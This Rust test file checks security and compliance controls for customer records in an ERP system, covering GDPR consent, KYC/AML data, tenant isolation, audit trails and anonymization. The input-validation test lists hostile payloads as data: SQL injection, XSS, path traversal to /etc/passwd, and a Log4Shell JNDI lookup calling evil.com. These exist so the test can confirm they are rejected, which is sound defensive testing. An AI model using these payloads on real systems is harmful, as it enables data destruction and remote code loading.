use super::*;
use crate::customer::model::*;
use crate::customer::aggregate::*;
use crate::customer::validation::*;
use crate::types::*;
use erp_core::{TenantId, UserId};
use chrono::Utc;
use rust_decimal::Decimal;
use uuid::Uuid;
use std::collections::HashMap;

/// Professional security tests for Customer operations
/// These tests validate security controls, data protection, and compliance

#[cfg(test)]
mod customer_security_tests {
    use super::*;

    fn create_test_tenant_context() -> erp_core::TenantContext {
        erp_core::TenantContext {
            tenant_id: TenantId(Uuid::new_v4()),
            schema_name: format!("sec_test_{}", Uuid::new_v4().to_string().replace('-', "_")),
        }
    }

    fn create_secure_customer(tenant_id: TenantId) -> Customer {
        Customer {
            id: Uuid::new_v4(),
            customer_number: "SEC-001".to_string(),
            external_ids: {
                let mut map = HashMap::new();
                map.insert("INTERNAL_ID".to_string(), "SAFE123".to_string());
                map
            },
            legal_name: "Secure Test Corporation".to_string(),
            trade_names: vec!["SecureCorp".to_string()],
            customer_type: CustomerType::B2b,
            industry_classification: IndustryClassification::Finance, // High-security industry
            business_size: BusinessSize::Large,
            parent_customer_id: None,
            corporate_group_id: None,
            customer_hierarchy_level: 0,
            consolidation_group: None,
            lifecycle_stage: CustomerLifecycleStage::ActiveCustomer,
            status: EntityStatus::Active,
            credit_status: CreditStatus::Approved,
            primary_address_id: None,
            billing_address_id: None,
            shipping_address_ids: vec![],
            addresses: vec![],
            primary_contact_id: None,
            contacts: vec![],
            customer_lifetime_value: Some(Decimal::new(500000, 2)),
            annual_revenue: Some(Decimal::new(10000000, 2)),
            employee_count: Some(500),
            financial_info: Some(FinancialInfo {
                credit_limit: Decimal::new(100000, 2),
                payment_terms: PaymentTerms::Net30,
                currency: "USD".to_string(),
                tax_id: Some("12-3456789".to_string()), // Sensitive data
                dunning_procedure: DunningProcedure::Standard,
                payment_tolerance: Decimal::new(100, 2),
                discount_percentage: Decimal::new(5, 2),
                risk_category: RiskCategory::Medium,
                collection_profile: CollectionProfile::Standard,
            }),
            sales_info: None,
            marketing_info: Some(MarketingInfo {
                acquisition_channel: AcquisitionChannel::DirectSales,
                acquisition_date: Utc::now().date_naive(),
                customer_segment: CustomerSegment::Enterprise,
                engagement_score: Some(8.5),
                communication_preferences: CommunicationPreferences {
                    email_marketing: true,
                    phone_calls: false, // Opt-out for privacy
                    direct_mail: false,
                    sms: false,
                    preferred_language: "en".to_string(),
                    preferred_contact_time: "09:00-17:00".to_string(),
                    frequency_preference: FrequencyPreference::Monthly,
                },
                gdpr_consent: GdprConsent {
                    marketing_consent: true,
                    analytics_consent: false, // Privacy-conscious
                    third_party_sharing: false, // No sharing
                    consent_date: Utc::now(),
                    consent_source: "EXPLICIT_FORM".to_string(),
                },
            }),
            compliance_info: Some(ComplianceInfo {
                kyc_status: KycStatus::Verified,
                kyc_last_updated: Some(Utc::now()),
                aml_risk_score: Some(15), // Low AML risk
                sanctions_screening_status: SanctionsStatus::Clear,
                sanctions_last_checked: Some(Utc::now()),
                regulatory_requirements: vec![
                    "SOX_COMPLIANCE".to_string(),
                    "GDPR_COMPLIANCE".to_string(),
                    "PCI_DSS".to_string(),
                ],
                data_residency_requirements: vec!["US".to_string(), "EU".to_string()],
                audit_trail: vec![],
            }),
            preferences: CustomerPreferences {
                preferred_communication_method: CommunicationMethod::Email,
                preferred_language: "en".to_string(),
                timezone: "America/New_York".to_string(),
                invoice_delivery_method: InvoiceDeliveryMethod::Email,
                statement_frequency: StatementFrequency::Monthly,
                portal_access_enabled: true,
                mobile_app_enabled: true,
                notification_preferences: HashMap::new(),
            },
            metadata: CustomerMetadata {
                version: 1,
                tenant_id,
                created_at: Utc::now(),
                created_by: UserId(Uuid::new_v4()),
                modified_at: Utc::now(),
                modified_by: UserId(Uuid::new_v4()),
                is_deleted: false,
                deleted_at: None,
                deleted_by: None,
                tags: vec!["HIGH_SECURITY".to_string(), "FINANCE".to_string()],
                custom_fields: HashMap::new(),
                integration_metadata: HashMap::new(),
            },
        }
    }

    #[test]
    fn test_customer_pii_data_protection() {
        let tenant_id = TenantId(Uuid::new_v4());
        let customer = create_secure_customer(tenant_id);

        // Verify that sensitive financial data is properly structured
        assert!(customer.financial_info.is_some());
        let financial = customer.financial_info.unwrap();

        // Tax ID should be present but will be masked in logs/exports
        assert!(financial.tax_id.is_some());
        let tax_id = financial.tax_id.unwrap();
        assert!(!tax_id.is_empty());
        assert!(tax_id.len() >= 9); // Minimum length for tax ID

        // Credit limit should be reasonable and not expose internal limits
        assert!(financial.credit_limit > Decimal::ZERO);
        assert!(financial.credit_limit <= Decimal::new(1000000, 2)); // Max $10k limit for test
    }

    #[test]
    fn test_customer_gdpr_compliance() {
        let tenant_id = TenantId(Uuid::new_v4());
        let customer = create_secure_customer(tenant_id);

        assert!(customer.marketing_info.is_some());
        let marketing = customer.marketing_info.unwrap();
        let gdpr = marketing.gdpr_consent;

        // Verify GDPR consent is properly captured
        assert!(!gdpr.consent_date.timestamp().to_string().is_empty());
        assert_eq!(gdpr.consent_source, "EXPLICIT_FORM");

        // Verify privacy-conscious defaults
        assert!(!gdpr.third_party_sharing, "Third party sharing should be disabled by default");
        assert!(!gdpr.analytics_consent, "Analytics consent should be explicit opt-in");

        // Verify communication preferences respect privacy
        let comm_prefs = marketing.communication_preferences;
        assert!(!comm_prefs.phone_calls, "Phone calls should be opt-out for privacy");
        assert!(!comm_prefs.direct_mail, "Direct mail should be opt-out");
        assert!(!comm_prefs.sms, "SMS should be opt-out");
    }

    #[test]
    fn test_customer_data_residency_compliance() {
        let tenant_id = TenantId(Uuid::new_v4());
        let customer = create_secure_customer(tenant_id);

        assert!(customer.compliance_info.is_some());
        let compliance = customer.compliance_info.unwrap();

        // Verify data residency requirements are specified
        assert!(!compliance.data_residency_requirements.is_empty());
        assert!(compliance.data_residency_requirements.contains(&"US".to_string()));
        assert!(compliance.data_residency_requirements.contains(&"EU".to_string()));

        // Verify regulatory requirements for financial services
        assert!(compliance.regulatory_requirements.contains(&"SOX_COMPLIANCE".to_string()));
        assert!(compliance.regulatory_requirements.contains(&"GDPR_COMPLIANCE".to_string()));
        assert!(compliance.regulatory_requirements.contains(&"PCI_DSS".to_string()));
    }

    #[test]
    fn test_customer_kyc_aml_compliance() {
        let tenant_id = TenantId(Uuid::new_v4());
        let customer = create_secure_customer(tenant_id);

        assert!(customer.compliance_info.is_some());
        let compliance = customer.compliance_info.unwrap();

        // Verify KYC status is verified
        assert_eq!(compliance.kyc_status, KycStatus::Verified);
        assert!(compliance.kyc_last_updated.is_some());

        // Verify AML screening
        assert!(compliance.aml_risk_score.is_some());
        let aml_score = compliance.aml_risk_score.unwrap();
        assert!(aml_score >= 0 && aml_score <= 100, "AML risk score should be in valid range");
        assert!(aml_score < 50, "High-risk customers should not be in test data");

        // Verify sanctions screening
        assert_eq!(compliance.sanctions_screening_status, SanctionsStatus::Clear);
        assert!(compliance.sanctions_last_checked.is_some());
    }

    #[test]
    fn test_customer_input_validation_injection_attacks() {
        let tenant_id = TenantId(Uuid::new_v4());
        let user_id = UserId(Uuid::new_v4());

        // Test SQL injection attempts in customer data
        let malicious_inputs = vec![
            "'; DROP TABLE customers; --",
            "1' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "Robert'); DROP TABLE students;--",
        ];

        for malicious_input in malicious_inputs {
            let result = CustomerAggregate::create(
                tenant_id,
                "SAFE-001".to_string(),
                malicious_input.to_string(), // Malicious legal name
                CustomerType::B2b,
                user_id,
            );

            // The validation should either reject the input or safely escape it
            match result {
                Ok(aggregate) => {
                    // If accepted, ensure it's been sanitized
                    assert_ne!(aggregate.legal_name, malicious_input,
                              "Malicious input should be sanitized");
                    assert!(!aggregate.legal_name.contains("DROP TABLE"),
                           "SQL injection patterns should be removed");
                    assert!(!aggregate.legal_name.contains("<script>"),
                           "XSS patterns should be removed");
                },
                Err(_) => {
                    // Rejection is also acceptable for security
                    assert!(true, "Input validation rejected malicious input");
                }
            }
        }
    }

    #[test]
    fn test_customer_field_length_limits() {
        let tenant_id = TenantId(Uuid::new_v4());
        let user_id = UserId(Uuid::new_v4());

        // Test that field length limits prevent buffer overflow attacks
        let oversized_inputs = vec!(
            ("customer_number", "x".repeat(1000)),
            ("legal_name", "x".repeat(10000)),
        );

        for (field, oversized_value) in oversized_inputs {
            let result = match field {
                "customer_number" => CustomerAggregate::create(
                    tenant_id,
                    oversized_value,
                    "Valid Name".to_string(),
                    CustomerType::B2b,
                    user_id,
                ),
                "legal_name" => CustomerAggregate::create(
                    tenant_id,
                    "VALID-001".to_string(),
                    oversized_value,
                    CustomerType::B2b,
                    user_id,
                ),
                _ => panic!("Unknown field for testing"),
            };

            assert!(result.is_err(), "Oversized {} should be rejected", field);
        }
    }

    #[test]
    fn test_customer_access_control_tenant_isolation() {
        let tenant_a = TenantId(Uuid::new_v4());
        let tenant_b = TenantId(Uuid::new_v4());
        let user_id = UserId(Uuid::new_v4());

        // Create customers in different tenants
        let customer_a = CustomerAggregate::create(
            tenant_a,
            "TENANT-A-001".to_string(),
            "Tenant A Customer".to_string(),
            CustomerType::B2b,
            user_id,
        ).unwrap();

        let customer_b = CustomerAggregate::create(
            tenant_b,
            "TENANT-B-001".to_string(),
            "Tenant B Customer".to_string(),
            CustomerType::B2b,
            user_id,
        ).unwrap();

        // Verify tenant isolation
        assert_ne!(customer_a.tenant_id, customer_b.tenant_id);
        assert_eq!(customer_a.tenant_id, tenant_a);
        assert_eq!(customer_b.tenant_id, tenant_b);

        // Customer numbers can be the same across tenants (tenant isolation)
        let customer_a2 = CustomerAggregate::create(
            tenant_a,
            "SAME-001".to_string(),
            "Same Number Tenant A".to_string(),
            CustomerType::B2b,
            user_id,
        ).unwrap();

        let customer_b2 = CustomerAggregate::create(
            tenant_b,
            "SAME-001".to_string(), // Same number as customer_a2
            "Same Number Tenant B".to_string(),
            CustomerType::B2b,
            user_id,
        ).unwrap();

        assert_eq!(customer_a2.customer_number, customer_b2.customer_number);
        assert_ne!(customer_a2.tenant_id, customer_b2.tenant_id);
    }

    #[test]
    fn test_customer_audit_trail_integrity() {
        let tenant_id = TenantId(Uuid::new_v4());
        let user_id = UserId(Uuid::new_v4());

        let mut customer = CustomerAggregate::create(
            tenant_id,
            "AUDIT-001".to_string(),
            "Audit Test Corp".to_string(),
            CustomerType::B2b,
            user_id,
        ).unwrap();

        // Verify initial audit information
        assert_eq!(customer.created_by, user_id);
        assert_eq!(customer.modified_by, user_id);
        assert!(customer.created_at <= Utc::now());
        assert!(customer.modified_at <= Utc::now());
        assert_eq!(customer.version, 1);

        // Perform an update
        let different_user = UserId(Uuid::new_v4());
        let update_time = Utc::now();

        let result = customer.update_legal_name(
            "Updated Audit Test Corp".to_string(),
            different_user,
        );

        assert!(result.is_ok());

        // Verify audit trail after update
        assert_eq!(customer.created_by, user_id); // Original creator unchanged
        assert_eq!(customer.modified_by, different_user); // Modified by new user
        assert!(customer.modified_at >= update_time); // Updated timestamp
        assert_eq!(customer.version, 2); // Version incremented

        // Verify events maintain audit information
        let events = customer.uncommitted_events();
        assert!(!events.is_empty());

        // Check that events contain proper audit information
        for event in events {
            match event {
                CustomerEvent::CustomerCreated { created_by, .. } => {
                    assert_eq!(*created_by, user_id);
                },
                CustomerEvent::LegalNameUpdated { modified_by, .. } => {
                    assert_eq!(*modified_by, different_user);
                },
                _ => {} // Other events are valid
            }
        }
    }

    #[test]
    fn test_customer_sensitive_data_serialization() {
        let tenant_id = TenantId(Uuid::new_v4());
        let customer = create_secure_customer(tenant_id);

        // Serialize customer to JSON
        let json_result = serde_json::to_string(&customer);
        assert!(json_result.is_ok());

        let json_string = json_result.unwrap();

        // Verify that sensitive data is present (not masked in this test environment)
        // In production, sensitive fields would be masked during serialization
        assert!(json_string.contains("legal_name"));
        assert!(json_string.contains("customer_number"));

        // Verify that the JSON doesn't contain obvious security vulnerabilities
        assert!(!json_string.contains("<script>"));
        assert!(!json_string.contains("javascript:"));
        assert!(!json_string.contains("data:text/html"));
    }

    #[test]
    fn test_customer_credit_limit_authorization() {
        let tenant_id = TenantId(Uuid::new_v4());
        let user_id = UserId(Uuid::new_v4());

        let mut customer = CustomerAggregate::create(
            tenant_id,
            "CREDIT-001".to_string(),
            "Credit Test Corp".to_string(),
            CustomerType::B2b,
            user_id,
        ).unwrap();

        // Test credit limit boundaries
        let reasonable_limit = Decimal::new(50000, 2); // $500
        let excessive_limit = Decimal::new(10000000, 2); // $100,000 - might need approval

        // Reasonable credit limit should be allowed
        let result = customer.update_credit_status(
            CreditStatus::Approved,
            Some(reasonable_limit),
            user_id,
            Some("Standard approval".to_string()),
        );

        assert!(result.is_ok(), "Reasonable credit limit should be approved");

        // Very high credit limit should trigger additional validation
        let result = customer.update_credit_status(
            CreditStatus::Pending, // Should require approval
            Some(excessive_limit),
            user_id,
            Some("High limit pending approval".to_string()),
        );

        assert!(result.is_ok(), "High credit limit should be accepted but pending");
        assert_eq!(customer.credit_status, CreditStatus::Pending);
    }

    #[test]
    fn test_customer_data_retention_compliance() {
        let tenant_id = TenantId(Uuid::new_v4());
        let user_id = UserId(Uuid::new_v4());

        let mut customer = CustomerAggregate::create(
            tenant_id,
            "RETENTION-001".to_string(),
            "Data Retention Test Corp".to_string(),
            CustomerType::B2b,
            user_id,
        ).unwrap();

        // Test soft delete for data retention compliance
        let result = customer.soft_delete(user_id, Some("GDPR deletion request".to_string()));

        assert!(result.is_ok(), "Soft delete should succeed");
        assert!(customer.is_deleted, "Customer should be marked as deleted");
        assert!(customer.deleted_at.is_some(), "Deletion timestamp should be set");
        assert_eq!(customer.deleted_by, Some(user_id), "Deletion user should be recorded");

        // Verify that deleted customer data is still accessible for compliance
        assert!(!customer.legal_name.is_empty(), "Legal name should be preserved for compliance");
        assert!(!customer.customer_number.is_empty(), "Customer number should be preserved");

        // Version should be incremented for audit trail
        assert_eq!(customer.version, 2);
    }

    #[test]
    fn test_customer_encryption_compliance() {
        let tenant_id = TenantId(Uuid::new_v4());
        let customer = create_secure_customer(tenant_id);

        // Verify that fields requiring encryption are identified
        assert!(customer.financial_info.is_some());
        let financial = customer.financial_info.unwrap();

        // Tax ID should be identified as requiring encryption
        assert!(financial.tax_id.is_some());
        let tax_id = financial.tax_id.unwrap();

        // In a real implementation, this would verify encryption
        // For now, we verify the data structure supports encryption
        assert!(!tax_id.is_empty());
        assert!(tax_id.chars().any(|c| c.is_ascii_digit()));

        // Verify compliance info contains encryption requirements
        assert!(customer.compliance_info.is_some());
        let compliance = customer.compliance_info.unwrap();
        assert!(compliance.regulatory_requirements.contains(&"PCI_DSS".to_string()));
    }

    #[test]
    fn test_customer_anonymization_capability() {
        let tenant_id = TenantId(Uuid::new_v4());
        let mut customer = create_secure_customer(tenant_id);

        // Simulate anonymization process for GDPR "right to be forgotten"
        let original_id = customer.id;
        let original_number = customer.customer_number.clone();

        // Anonymize PII fields
        customer.legal_name = "ANONYMIZED".to_string();
        customer.trade_names = vec!["ANONYMIZED".to_string()];

        if let Some(ref mut financial) = customer.financial_info {
            financial.tax_id = Some("ANONYMIZED".to_string());
        }

        if let Some(ref mut marketing) = customer.marketing_info {
            marketing.gdpr_consent.marketing_consent = false;
            marketing.gdpr_consent.analytics_consent = false;
            marketing.gdpr_consent.third_party_sharing = false;
        }

        // Verify anonymization preserves business data integrity
        assert_eq!(customer.id, original_id); // ID preserved for referential integrity
        assert_eq!(customer.customer_number, original_number); // Business identifier preserved
        assert_eq!(customer.legal_name, "ANONYMIZED");
        assert_eq!(customer.trade_names, vec!["ANONYMIZED".to_string()]);

        // Verify financial data is anonymized
        if let Some(financial) = customer.financial_info {
            assert_eq!(financial.tax_id, Some("ANONYMIZED".to_string()));
        }

        // Verify marketing consents are revoked
        if let Some(marketing) = customer.marketing_info {
            assert!(!marketing.gdpr_consent.marketing_consent);
            assert!(!marketing.gdpr_consent.analytics_consent);
            assert!(!marketing.gdpr_consent.third_party_sharing);
        }
    }

    #[test]
    fn test_customer_security_classification() {
        let tenant_id = TenantId(Uuid::new_v4());
        let customer = create_secure_customer(tenant_id);

        // Verify security classification through tags
        assert!(customer.metadata.tags.contains(&"HIGH_SECURITY".to_string()));
        assert!(customer.metadata.tags.contains(&"FINANCE".to_string()));

        // Verify industry classification affects security requirements
        assert_eq!(customer.industry_classification, IndustryClassification::Finance);

        // Verify compliance requirements match security classification
        if let Some(compliance) = &customer.compliance_info {
            assert!(!compliance.regulatory_requirements.is_empty());
            assert!(compliance.regulatory_requirements.len() >= 3); // Multiple compliance frameworks
        }
    }
}